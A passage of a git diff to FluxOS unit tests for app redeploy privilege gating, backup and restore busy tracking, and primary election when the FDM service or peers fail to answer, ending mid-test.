@@ -4,7 +4,9 @@ process.env.NODE_CONFIG_DIR = `${process.cwd()}/tests/unit/globalconfig`;
 const { expect } = require('chai');
 const sinon = require('sinon');
 const axios = require('axios');
+const config = require('config');
 const advancedWorkflows = require('../../ZelBack/src/services/appLifecycle/advancedWorkflows');
+const { Privilege, authOf } = require('../../ZelBack/src/services/utils/privileges');
 const dbHelper = require('../../ZelBack/src/services/dbHelper');
 const appsRuntimeState = require('../../ZelBack/src/services/appManagement/appsRuntimeState');
 const log = require('../../ZelBack/src/lib/log');
@@ -61,41 +63,6 @@ describe('advancedWorkflows tests', () => {
       const inProgress = advancedWorkflows.getRemovalInProgress();
       // When setting specific app, function returns the app name, not just true
       expect(inProgress).to.equal('TestApp');
-    });
-  });
-
-  describe('addToRestoreProgress and removeFromRestoreProgress tests', () => {
-    beforeEach(() => {
-      // eslint-disable-next-line global-require
-      const globalState = require('../../ZelBack/src/services/utils/globalState');
-      globalState.restoreInProgress = [];
-    });
-
-    it('should add app to restore progress', () => {
-      advancedWorkflows.addToRestoreProgress('TestApp');
-
-      // eslint-disable-next-line global-require
-      const globalState = require('../../ZelBack/src/services/utils/globalState');
-      expect(globalState.restoreInProgress).to.include('TestApp');
-    });
-
-    it('should remove app from restore progress', () => {
-      advancedWorkflows.addToRestoreProgress('TestApp');
-      advancedWorkflows.removeFromRestoreProgress('TestApp');
-
-      // eslint-disable-next-line global-require
-      const globalState = require('../../ZelBack/src/services/utils/globalState');
-      expect(globalState.restoreInProgress).to.not.include('TestApp');
-    });
-
-    it('should not duplicate apps in restore progress', () => {
-      advancedWorkflows.addToRestoreProgress('TestApp');
-      advancedWorkflows.addToRestoreProgress('TestApp');
-
-      // eslint-disable-next-line global-require
-      const globalState = require('../../ZelBack/src/services/utils/globalState');
-      const count = globalState.restoreInProgress.filter((app) => app === 'TestApp').length;
-      expect(count).to.equal(1);
     });
   });
 
@@ -168,8 +135,8 @@ describe('advancedWorkflows tests', () => {
       req.params.appname = 'myapp';
       req.params.component = 'frontend';
 
-      // Use the proper method to add to restore progress
-      advancedWorkflows.addToRestoreProgress('myapp');
+      // the claim's own primitive - the list is a frozen snapshot to reads
+      globalState.tryStartRestore('myapp');
 
       sinon.stub(verificationHelper, 'verifyPrivilege').resolves(true);
 
@@ -181,10 +148,13 @@ describe('advancedWorkflows tests', () => {
       expect(response.data.message).to.include('Restore is running');
 
       // Clean up
-      advancedWorkflows.removeFromRestoreProgress('myapp');
+      globalState.finishRestore('myapp');
     });
 
-    it('should return unauthorized error if not authorized', async () => {
+    // The gate IS the policy: appownerorfluxteam refuses the node operator, and a
+    // forced redeploy rm -rf's the component's volume, so admitting them here
+    // would be the way around the appremove gate that already refuses them.
+    it('gates a component redeploy on the privilege that refuses the node operator', async () => {
       req.params.appname = 'myapp';
       req.params.component = 'frontend';
 
@@ -193,7 +163,7 @@ describe('advancedWorkflows tests', () => {
       await advancedWorkflows.redeployComponentAPI(req, res);
 
       expect(res.json.calledOnce).to.be.true;
-      expect(verificationHelper.verifyPrivilege.calledWith('appownerabove', req, 'myapp')).to.be.true;
+      sinon.assert.calledOnceWithExactly(verificationHelper.verifyPrivilege, Privilege.APP_OWNER_OR_FLUX_TEAM, authOf(req), { appName: 'myapp' });
     });
 
     it('should handle force parameter from query string', async () => {
@@ -211,6 +181,44 @@ describe('advancedWorkflows tests', () => {
 
       // Should attempt to call hardRedeployComponent but will fail because app not found
       expect(res.json.calledOnce).to.be.true;
+    });
+  });
+
+  // The whole-app gate matters for the same reason the component one does, and
+  // for more of the app: force=true takes every component through a hard
+  // uninstall, so all of the app's data on this node goes with it.
+  describe('redeployAPI tests', () => {
+    let req;
+    let res;
+    let globalState;
+    let verificationHelper;
+
+    beforeEach(() => {
+      // eslint-disable-next-line global-require
+      globalState = require('../../ZelBack/src/services/utils/globalState');
+      globalState.restoreInProgress = [];
+
+      // eslint-disable-next-line global-require
+      verificationHelper = require('../../ZelBack/src/services/verificationHelper');
+
+      req = { params: {}, query: {}, headers: {} };
+      res = {
+        json: sinon.stub(),
+        write: sinon.stub(),
+        flush: sinon.stub(),
+        setHeader: sinon.stub(),
+      };
+    });
+
+    it('gates a redeploy on the privilege that refuses the node operator', async () => {
+      req.params.appname = 'myapp';
+
+      sinon.stub(verificationHelper, 'verifyPrivilege').resolves(false);
+
+      await advancedWorkflows.redeployAPI(req, res);
+
+      expect(res.json.calledOnce).to.be.true;
+      sinon.assert.calledOnceWithExactly(verificationHelper.verifyPrivilege, Privilege.APP_OWNER_OR_FLUX_TEAM, authOf(req), { appName: 'myapp' });
     });
   });
 
@@ -471,6 +479,13 @@ describe('advancedWorkflows tests', () => {
     let axiosGetStub;
     let recursionCounter;
 
+    // What FDM sends when it IS answering and this app simply has no primary
+    // yet: a success body carrying an empty ips array. test-infra/fdm-stub
+    // returns exactly this, and it is a different fact from FDM not answering
+    // at all - that arrives as a rejection and stands the election down.
+    // A factory, not a shared literal, so no test can leak a mutation forward.
+    const fdmNoPrimary = () => ({ data: { status: 'success', data: { ips: [] } } });
+
     beforeEach(() => {
       recursionCounter = 0;
       globalState = require('../../ZelBack/src/services/utils/globalState');
@@ -482,6 +497,11 @@ describe('advancedWorkflows tests', () => {
       // the syncthing monitor's first-run mount-safety is assumed complete for the
       // election tests; a dedicated test below covers the not-complete skip
       globalState.syncthingAppsFirstRun = false;
+      // the election reads the busy lists and the receive-only cache off the
+      // real module now - state left by a prior test must not leak into this one
+      globalState.receiveOnlySyncthingAppsCache.clear();
+      globalState.backupInProgress.forEach((a) => globalState.finishBackup(a));
+      globalState.restoreInProgress.forEach((a) => globalState.finishRestore(a));
 
       // Setup stubs
       const serviceHelper = require('../../ZelBack/src/services/serviceHelper');
@@ -508,10 +528,7 @@ describe('advancedWorkflows tests', () => {
 
       const syncthingService = require('../../ZelBack/src/services/syncthingService');
       syncthingServiceStub = sinon.stub(syncthingService, 'getConfigFolders');
-      sinon.stub(syncthingService, 'getHealth').resolves({
-        status: 'success',
-        data: { status: 'OK' },
-      });
+      sinon.stub(syncthingService, 'getHealth').resolves({ status: 'OK' });
 
       // Stub decryptEnterpriseApps to return apps as-is
       const appQueryService = require('../../ZelBack/src/services/appQuery/appQueryService');
@@ -537,7 +554,7 @@ describe('advancedWorkflows tests', () => {
       // silence acted on has to supply the evidence for it.
       const syncthingServiceModule = require('../../ZelBack/src/services/syncthingService');
       syncthingCompletionStub = sinon.stub(syncthingServiceModule, 'getDbCompletion').resolves(null);
-      syncthingDevicesStub = sinon.stub(syncthingServiceModule, 'getConfigDevices').resolves({ status: 'success', data: [] });
+      syncthingDevicesStub = sinon.stub(syncthingServiceModule, 'getConfigDevices').resolves([]);
       globalState.syncthingDevicesIDCache.clear();
       const fluxCommunication = require('../../ZelBack/src/services/fluxCommunication');
       sinon.stub(fluxCommunication, 'peerResponsiveness').returns({ responding: 4, total: 4 });
@@ -548,18 +565,12 @@ describe('advancedWorkflows tests', () => {
 
       const installedApps = sinon.stub().resolves({ status: 'success', data: [] });
       const listRunningApps = sinon.stub().resolves({ status: 'success', data: [] });
-      const receiveOnlyCache = new Map();
-      const backupInProgress = [];
-      const restoreInProgress = [];
       const https = require('https');
 
       await advancedWorkflows.masterSlaveApps(
         globalState,
         installedApps,
         listRunningApps,
-        receiveOnlyCache,
-        backupInProgress,
-        restoreInProgress,
         https,
       );
 
@@ -571,18 +582,12 @@ describe('advancedWorkflows tests', () => {
 
       const installedApps = sinon.stub().resolves({ status: 'success', data: [] });
       const listRunningApps = sinon.stub().resolves({ status: 'success', data: [] });
-      const receiveOnlyCache = new Map();
-      const backupInProgress = [];
-      const restoreInProgress = [];
       const https = require('https');
 
       await advancedWorkflows.masterSlaveApps(
         globalState,
         installedApps,
         listRunningApps,
-        receiveOnlyCache,
-        backupInProgress,
-        restoreInProgress,
         https,
       );
 
@@ -598,9 +603,6 @@ describe('advancedWorkflows tests', () => {
         globalState,
         installedApps,
         listRunningApps,
-        new Map(),
-        [],
-        [],
         require('https'),
       );
 
@@ -608,6 +610,10 @@ describe('advancedWorkflows tests', () => {
       expect(installedApps.called).to.be.false;
     });
 
+    // The busy claim goes through the real primitive and the election reads the
+    // busy list off globalState itself - these two tests cover the WIRING, not a
+    // parameter. The old parameter-based version stayed green while the guard was
+    // dead in production (the boot capture went stale behind it).
     it('should skip apps in backup progress', async () => {
       const appName = 'testapp';
       const installedApps = sinon.stub().resolves({
@@ -621,29 +627,60 @@ describe('advancedWorkflows tests', () => {
         ],
       });
       const listRunningApps = sinon.stub().resolves({ status: 'success', data: [] });
-      const receiveOnlyCache = new Map();
-      const backupInProgress = [appName];
-      const restoreInProgress = [];
       const https = require('https');
 
       // Mock FDM to return no errors
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
 
-      // Execute - should skip processing this app due to backup
-      await advancedWorkflows.masterSlaveApps(
-        globalState,
-        installedApps,
-        listRunningApps,
-        receiveOnlyCache,
-        backupInProgress,
-        restoreInProgress,
-        https,
-      );
+      expect(globalState.tryStartBackup(appName)).to.equal(true);
+      try {
+        await advancedWorkflows.masterSlaveApps(
+          globalState,
+          installedApps,
+          listRunningApps,
+          https,
+        );
 
-      // Function should have been called to get installed apps
-      expect(installedApps.called).to.be.true;
-      // But FDM should not be queried since app is skipped
-      expect(serviceHelperStub.called).to.be.false;
+        // Function should have been called to get installed apps
+        expect(installedApps.called).to.be.true;
+        // But FDM should not be queried since app is skipped
+        expect(serviceHelperStub.called).to.be.false;
+      } finally {
+        globalState.finishBackup(appName);
+      }
+    });
+
+    it('should skip apps in restore progress', async () => {
+      const appName = 'testapp';
+      const installedApps = sinon.stub().resolves({
+        status: 'success',
+        data: [
+          {
+            name: appName,
+            version: 3,
+            containerData: 'g:/data',
+          },
+        ],
+      });
+      const listRunningApps = sinon.stub().resolves({ status: 'success', data: [] });
+      const https = require('https');
+
+      serviceHelperStub.resolves(fdmNoPrimary());
+
+      expect(globalState.tryStartRestore(appName)).to.equal(true);
+      try {
+        await advancedWorkflows.masterSlaveApps(
+          globalState,
+          installedApps,
+          listRunningApps,
+          https,
+        );
+
+        expect(installedApps.called).to.be.true;
+        expect(serviceHelperStub.called).to.be.false;
+      } finally {
+        globalState.finishRestore(appName);
+      }
     });
 
     // Shared fixture for the recovery tests below: a v3 g: app with this node in
@@ -666,7 +703,12 @@ describe('advancedWorkflows tests', () => {
         data: [{ name: appName, version: 3, containerData: 'g:/syncdata' }],
       });
       const listRunningApps = sinon.stub().resolves({ status: 'success', data: [] });
-      if (!receiveOnlyCache.has(appId)) receiveOnlyCache.set(appId, { restarted: true });
+      // Entries land in the real globalState cache - the election reads it off
+      // the module, not off a parameter. The entry OBJECTS are shared between
+      // the test's own map and the global one, so a test that inspects (or
+      // mutates) its map afterwards still meets production's in-place writes.
+      receiveOnlyCache.forEach((value, key) => globalState.receiveOnlySyncthingAppsCache.set(key, value));
+      if (!globalState.receiveOnlySyncthingAppsCache.has(appId)) globalState.receiveOnlySyncthingAppsCache.set(appId, { restarted: true });
       fluxNetworkHelperStub.resolves('192.168.1.5:16127');
       // Election order is runningSince ascending, with ip only as a tiebreak. Give
       // explicit, distinct timestamps so this node's index rests on the primary key
@@ -702,7 +744,7 @@ describe('advancedWorkflows tests', () => {
         delayCalls = 0;
         globalState.installationInProgress = false;
         await advancedWorkflows.masterSlaveApps(
-          globalState, installedApps, listRunningApps, receiveOnlyCache, [], [], require('https'),
+          globalState, installedApps, listRunningApps, require('https'),
         );
       };
     };
@@ -729,12 +771,108 @@ describe('advancedWorkflows tests', () => {
     // never resolved the peer and cannot say.
     const peerSyncthingSays = (peerSocketAddr, remoteState) => {
       globalState.syncthingDevicesIDCache.set(peerSocketAddr, `DEVICE-${peerSocketAddr}`);
-      syncthingCompletionStub.resolves({ status: 'success', data: { remoteState } });
+      syncthingCompletionStub.resolves({ remoteState });
     };
 
     const linesMatching = (logInfo, needle) => logInfo.getCalls()
       .map((call) => String(call.args[0]))
       .filter((msg) => msg.includes(needle));
+
+    // FDM has three answers, not two: it names a primary, it says this app has
+    // none yet, or it does not answer at all. The first two arrive alike as a
+    // null ip and only fdmOk separates the third from them. Reading silence as
+    // "no primary yet" is how a node that has lost FDM entirely walks into
+    // promoting itself onto a volume whose primary it simply cannot see.
+    describe('the three answers FDM can give', () => {
+      // No response object at all - a refused connection or a timeout, which is
+      // what an FDM outage looks like from the node.
+      const fdmUnreachable = () => new Error('connect ECONNREFUSED 10.0.0.1:16130');
+      const fdmHttpError = (status) => Object.assign(
+        new Error(`Request failed with status code ${status}`),
+        { response: { status } },
+      );
+
+      it('stands down when no region answers, instead of reading silence as "no primary"', async () => {
+        const appName = 'fdmsilentapp';
+        sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
+        const logInfo = sinon.stub(log, 'info');
+        const logWarn = sinon.stub(log, 'warn');
+        sinon.stub(log, 'error');
+        const runPass = electionFixture(appName, ['192.168.1.90:16127']);
+        serviceHelperStub.rejects(fdmUnreachable());
+        axiosGetStub.resetBehavior();
+        // No peer holds it either, so nothing else in the pass is keeping this
+        // node down - a stand-down here can only be the unanswered FDM.
+        axiosGetStub.callsFake(peerAnswers({ held: [] }));
+
+        await runPass();
+
+        expect(serviceHelperStub.callCount).to.equal(3); // every region tried first
+        expect(linesMatching(logWarn, 'All FDM services failed')).to.have.lengthOf(1);
+        // the two readings that must never be conflated, and the act that follows
+        expect(linesMatching(logInfo, 'has currently no primary set')).to.have.lengthOf(0);
+        expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
+      });
+
+      it('does not take a 503 for an answer - FDM reporting itself as starting up has named nothing', async () => {
+        const appName = 'fdm503app';
+        sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
+        const logInfo = sinon.stub(log, 'info');
+        const logWarn = sinon.stub(log, 'warn');
+        const runPass = electionFixture(appName, ['192.168.1.90:16127']);
+        serviceHelperStub.rejects(fdmHttpError(503));
+        axiosGetStub.resetBehavior();
+        axiosGetStub.callsFake(peerAnswers({ held: [] }));
+
+        await runPass();
+
+        expect(linesMatching(logWarn, 'All FDM services failed')).to.have.lengthOf(1);
+        expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
+      });
+
+      it('treats a 404 from every region as an answer, so an app FDM holds no record of still elects', async () => {
+        // The first primary of a newly deployed g: app is chosen while FDM has
+        // never heard of the app. Standing down on a 404 would leave it without a
+        // primary for as long as FDM had no row for it - a deadlock, not a guard.
+        const appName = 'fdm404app';
+        sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
+        const logInfo = sinon.stub(log, 'info');
+        const logWarn = sinon.stub(log, 'warn');
+        const runPass = electionFixture(appName, ['192.168.1.90:16127']);
+        serviceHelperStub.rejects(fdmHttpError(404));
+        axiosGetStub.resetBehavior();
+        axiosGetStub.callsFake(peerAnswers({ held: [] }));
+
+        await runPass();
+
+        expect(linesMatching(logWarn, 'All FDM services failed')).to.have.lengthOf(0);
+        expect(linesMatching(logInfo, 'has currently no primary set')).to.have.lengthOf(1);
+        expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(1);
+      });
+
+      it('needs only one region to answer, so losing two of the three does not stand the election down', async () => {
+        // fdmOk asks whether ANY region gave a verdict. Requiring all three would
+        // stand every g: app down on the routine failure of a single region.
+        const appName = 'fdmpartialapp';
+        sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
+        const logInfo = sinon.stub(log, 'info');
+        const logWarn = sinon.stub(log, 'warn');
+        sinon.stub(log, 'error');
+        const runPass = electionFixture(appName, ['192.168.1.90:16127']);
+        serviceHelperStub.onCall(0).rejects(fdmUnreachable());
+        serviceHelperStub.onCall(1).rejects(fdmUnreachable());
+        serviceHelperStub.onCall(2).resolves(fdmNoPrimary());
+        axiosGetStub.resetBehavior();
+        axiosGetStub.callsFake(peerAnswers({ held: [] }));
+
+        await runPass();
+
+        expect(serviceHelperStub.callCount).to.equal(3);
+        expect(linesMatching(logWarn, 'All FDM services failed')).to.have.lengthOf(0);
+        expect(linesMatching(logInfo, 'has currently no primary set')).to.have.lengthOf(1);
+        expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(1);
+      });
+    });
 
     it('announces the exclusion once when a g: component is operator-stopped, not every cycle', async () => {
       const appName = 'opstoppedapp';
@@ -760,7 +898,7 @@ describe('advancedWorkflows tests', () => {
       const operatorStopped = sinon.stub(appsRuntimeState, 'isOperatorStopped');
       const logInfo = sinon.stub(log, 'info');
       const runPass = electionFixture(appName);
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
 
       operatorStopped.resetBehavior();
       operatorStopped.resolves(true);
@@ -806,7 +944,7 @@ describe('advancedWorkflows tests', () => {
       // no-history start and the previous-primary branch. Without the eviction it
       // logs "conditions not met" forever and the app never returns.
       serviceHelperStub.resetBehavior();
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       await runPass();
 
       expect(linesMatching(logInfo, 'cleared this node\'s own stale primary record')).to.have.lengthOf(1);
@@ -819,7 +957,7 @@ describe('advancedWorkflows tests', () => {
       sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
       const logInfo = sinon.stub(log, 'info');
       const runPass = electionFixture(appName, ['192.168.1.90:16127']);
-      serviceHelperStub.resolves({ data: [] }); // FDM: no primary registered yet
+      serviceHelperStub.resolves(fdmNoPrimary()); // FDM: no primary registered yet
 
       // the peer IS running it - FDM simply has not caught up yet
       axiosGetStub.resetBehavior();
@@ -836,7 +974,7 @@ describe('advancedWorkflows tests', () => {
       sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
       const logInfo = sinon.stub(log, 'info');
       const runPass = electionFixture(appName, ['192.168.1.90:16127']);
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
 
       // peer answers, and is NOT running the component
       axiosGetStub.resetBehavior();
@@ -862,7 +1000,7 @@ describe('advancedWorkflows tests', () => {
         ['192.168.1.90:16127', '192.168.1.91:16127'],
         { selfRunningSince: '2026-01-01T00:02:30.000Z', receiveOnlyCache: cache },
       );
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       axiosGetStub.resetBehavior();
       axiosGetStub.callsFake(peerAnswers({ held: [] }));
 
@@ -887,7 +1025,7 @@ describe('advancedWorkflows tests', () => {
       sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
       const logInfo = sinon.stub(log, 'info');
       const runPass = electionFixture(appName, ['192.168.1.90:16127']);
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
 
       // holds the component, runs no containers at all
       axiosGetStub.resetBehavior();
@@ -907,7 +1045,7 @@ describe('advancedWorkflows tests', () => {
       sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
       const logInfo = sinon.stub(log, 'info');
       const runPass = electionFixture(appName, ['192.168.1.90:16127']);
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
 
       axiosGetStub.resetBehavior();
       axiosGetStub.callsFake(peerAnswers({ held: null, running: [{ Names: [`/flux${appName}`] }] }));
@@ -915,6 +1053,75 @@ describe('advancedWorkflows tests', () => {
       await runPass();
 
       expect(linesMatching(logInfo, 'is running on peer node')).to.have.lengthOf(1);
+      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
+    });
+
+    it('starts over an operator-stopped peer that is too old to say so - the rollout window, pinned deliberately', async () => {
+      // THIS IS THE LIMITATION, NOT THE BEHAVIOUR WE WANT. It is asserted so that
+      // it cannot be changed by accident, and so the next person to touch the
+      // fall-through has to decide about it rather than discover it.
+      //
+      // /apps/heldcomponents landed on development; the released line does not
+      // have it, and is 356 commits behind. A released node CAN hold the durable
+      // operator-stop lock and DOES honour it - it simply has no route with which
+      // to report it, so it answers 404.
+      //
+      // A 404 is a peer answering the old way, so the probe falls through to the
+      // container list. The owner's container is stopped, so it is not in that
+      // list, and this node reads the component as free and starts it: a second
+      // writer on the shared volume while its owner edits files on the first.
+      //
+      // There is nothing better to ask - a peer cannot answer a question its code
+      // does not contain, and reading the 404 as "holds nothing" would be the same
+      // start reached from the other direction. The hole closes only when the last
+      // node upgrades (~4h per release), and the harness cannot reproduce it:
+      // createTestEnv's legacyNodes toggles ArcaneOS vs legacy, i.e. the platform,
+      // not the FluxOS version.
+      //
+      // The test above covers the 404 fall-through only for a peer that IS running
+      // the component, where the container list happens to give the right answer.
+      // This is the case where it does not.
+      const appName = 'peeroldstoppedapp';
+      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
+      const logInfo = sinon.stub(log, 'info');
+      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
+      serviceHelperStub.resolves(fdmNoPrimary());
+
+      axiosGetStub.resetBehavior();
+      // 404 to heldcomponents, and an empty container list - which is exactly what
+      // a released node whose owner has stopped this component looks like.
+      axiosGetStub.callsFake(peerAnswers({ held: null, running: [] }));
+
+      await runPass();
+
+      expect(
+        linesMatching(logInfo, 'starting docker component'),
+        'the rollout exposure changed - a released peer holding the lock is now being ruled out, or the fall-through moved',
+      ).to.have.lengthOf(1);
+    });
+
+    it('will not start against a peer whose held-components answer is an in-band error', async () => {
+      // FluxOS reports failures inside a 200, so a peer that HAS the endpoint and
+      // could not serve it looks, by shape alone, like a peer too old to have it -
+      // and the old-peer path falls back to the container list.
+      // That fallback cannot see the durable stop lock at all. So a peer whose lock
+      // store is unreadable would report an owner-stopped primary as free, and this
+      // node would elect itself onto the volume that owner is working on. The
+      // container list here says free, and the pass must still refuse.
+      const appName = 'peerunreadableapp';
+      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
+      const logInfo = sinon.stub(log, 'info');
+      const runPass = electionFixture(appName, ['192.168.1.90:16127']);
+      serviceHelperStub.resolves(fdmNoPrimary());
+
+      axiosGetStub.resetBehavior();
+      axiosGetStub.callsFake((url) => (url.includes('/apps/heldcomponents')
+        ? Promise.resolve({ data: { status: 'error', data: { name: 'Error', message: 'no primary available' } } })
+        : Promise.resolve({ data: { data: [] } })));
+
+      await runPass();
+
+      expect(linesMatching(logInfo, 'could not answer what it holds')).to.have.lengthOf(1);
       expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
     });
 
@@ -930,7 +1137,7 @@ describe('advancedWorkflows tests', () => {
       const releaseStarting = sinon.stub(appReconciler, 'releaseStarting');
       const setControllerDesired = sinon.stub(appReconciler, 'setControllerDesired');
       const runPass = electionFixture(appName, ['192.168.1.90:16127']);
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       axiosGetStub.resetBehavior();
       axiosGetStub.callsFake(peerAnswers({ held: [] })); // nobody holds it - we start
 
@@ -963,7 +1170,7 @@ describe('advancedWorkflows tests', () => {
       sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
       const logInfo = sinon.stub(log, 'info');
       const runPass = electionFixture(appName, ['192.168.1.90:16127']);
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
 
       axiosGetStub.resetBehavior();
       // answered the OLD way, so the whole-name comparison is what is under test
@@ -990,7 +1197,7 @@ describe('advancedWorkflows tests', () => {
         ['192.168.1.90:16127', '192.168.1.91:16127', '192.168.1.92:16127'],
         { selfRunningSince: '2026-01-01T00:02:30.000Z', receiveOnlyCache: cache },
       );
-      serviceHelperStub.resolves({ data: [] }); // FDM: no primary registered yet
+      serviceHelperStub.resolves(fdmNoPrimary()); // FDM: no primary registered yet
 
       // Order: .90 (00:01), .91 (00:02), this node (00:02:30), .92 (00:03). Only
       // .92 - the peer above us, invisible to a lower-index probe - is running it.
@@ -1021,7 +1228,7 @@ describe('advancedWorkflows tests', () => {
         ['192.168.1.90:16127', '192.168.1.91:16127'],
         { selfRunningSince: '2026-01-01T00:02:30.000Z', receiveOnlyCache: cache },
       );
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       axiosGetStub.resetBehavior();
       axiosGetStub.resolves({ data: { data: [] } }); // no peer is running it
 
@@ -1044,7 +1251,7 @@ describe('advancedWorkflows tests', () => {
       const runPass = electionFixture(appName, [
         '192.168.1.90:16127', '192.168.1.91:16127', '192.168.1.92:16127',
       ]);
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
 
       // Hold every probe open and release them only once all have been issued.
       // Probing one peer at a time cannot get past the first: its await never
@@ -1078,7 +1285,7 @@ describe('advancedWorkflows tests', () => {
       sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
       const logInfo = sinon.stub(log, 'info');
       const runPass = electionFixture(appName, ['192.168.1.90:16127']);
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       // the peer answers nothing at all (the axios default), but its sync connection
       // to this node is open
       peerSyncthingSays('192.168.1.90:16127', 'valid');
@@ -1098,7 +1305,7 @@ describe('advancedWorkflows tests', () => {
       sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
       const logInfo = sinon.stub(log, 'info');
       const runPass = electionFixture(appName, ['192.168.1.90:16127']);
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       // no device cached for the peer, and the peer answers nothing
 
       await runPass();
@@ -1115,7 +1322,7 @@ describe('advancedWorkflows tests', () => {
       sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
       const logInfo = sinon.stub(log, 'info');
       const runPass = electionFixture(appName, ['192.168.1.90:16127']);
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       peerSyncthingSays('192.168.1.90:16127', 'unknown');
 
       await runPass();
@@ -1135,14 +1342,11 @@ describe('advancedWorkflows tests', () => {
       sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
       const logInfo = sinon.stub(log, 'info');
       const runPass = electionFixture(appName, ['192.168.1.90:16127']);
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       // nothing cached, but this node's syncthing still has the device configured
       // under the name the monitor gave it, and reports the connection closed
-      syncthingDevicesStub.resolves({
-        status: 'success',
-        data: [{ name: '192.168.1.90:16127', deviceID: 'DEVICE-DEAD-PEER' }],
-      });
-      syncthingCompletionStub.resolves({ status: 'success', data: { remoteState: 'unknown' } });
+      syncthingDevicesStub.resolves([{ name: '192.168.1.90:16127', deviceID: 'DEVICE-DEAD-PEER' }]);
+      syncthingCompletionStub.resolves({ remoteState: 'unknown' });
 
       await runPass();
 
@@ -1159,7 +1363,7 @@ describe('advancedWorkflows tests', () => {
       sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
       const logInfo = sinon.stub(log, 'info');
       const runPass = electionFixture(appName, ['192.168.1.90:16127']);
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       peerSyncthingSays('192.168.1.90:16127', 'unknown');
       const fluxCommunication = require('../../ZelBack/src/services/fluxCommunication');
       fluxCommunication.peerResponsiveness.returns({ responding: 1, total: 8 });
@@ -1178,7 +1382,7 @@ describe('advancedWorkflows tests', () => {
       sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
       const logInfo = sinon.stub(log, 'info');
       const runPass = electionFixture(appName, ['192.168.1.90:16127']);
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       axiosGetStub.resetBehavior();
       axiosGetStub.rejects(Object.assign(new Error('Request failed with status code 500'), { response: { status: 500 } }));
       peerSyncthingSays('192.168.1.90:16127', 'unknown');
@@ -1201,7 +1405,7 @@ describe('advancedWorkflows tests', () => {
         appName,
         ['192.168.1.90:16127', '192.168.1.91:16127', '192.168.1.92:16127'],
       );
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       axiosGetStub.resetBehavior();
       axiosGetStub.callsFake(async (url) => (url.includes('192.168.1.92')
         ? Promise.reject(new Error('peer unreachable'))
@@ -1227,7 +1431,7 @@ describe('advancedWorkflows tests', () => {
         ['192.168.1.90:16127'],
         { selfRunningSince: '2026-01-01T00:02:00.000Z' },
       );
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       // Only Date is faked: the schedule is compared against Date.now(), and faking
       // the timer functions as well would take the probe's own cancel timers with it.
       const clock = sinon.useFakeTimers({ now: Date.now(), toFake: ['Date'] });
@@ -1256,6 +1460,227 @@ describe('advancedWorkflows tests', () => {
       expect(linesMatching(logInfo, 'scheduling app')).to.have.lengthOf(0);
     });
 
+    it('asks every peer when a booked turn comes due at index 0, instead of asking nobody', async () => {
+      // The stagger serialises candidates by index, so a due turn only checks the
+      // nodes AHEAD of this one. At index 0 there are none, and "nobody ahead" was
+      // read as "nobody" - a start issued without a single peer being asked.
+      //
+      // Reaching it takes three things at once, which is why it is rare rather than
+      // impossible: a remembered primary (so the index-0 branch, which probes every
+      // peer, is skipped), a booked turn (so the previous-primary branch, which
+      // requires none, is skipped), and index 0 by the time the turn is due. The
+      // turn is booked at index >= 2 and index is re-derived from the location list
+      // every pass, so the instances ahead ageing out is all it takes.
+      //
+      // What makes it harmful is FDM's registration lag: for ~110s after a node
+      // starts, FDM still reports no primary. A less-senior node can be live and
+      // invisible throughout, and starting beside it puts two writers on the volume.
+      const appName = 'duestagger0app';
+      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
+      const logInfo = sinon.stub(log, 'info');
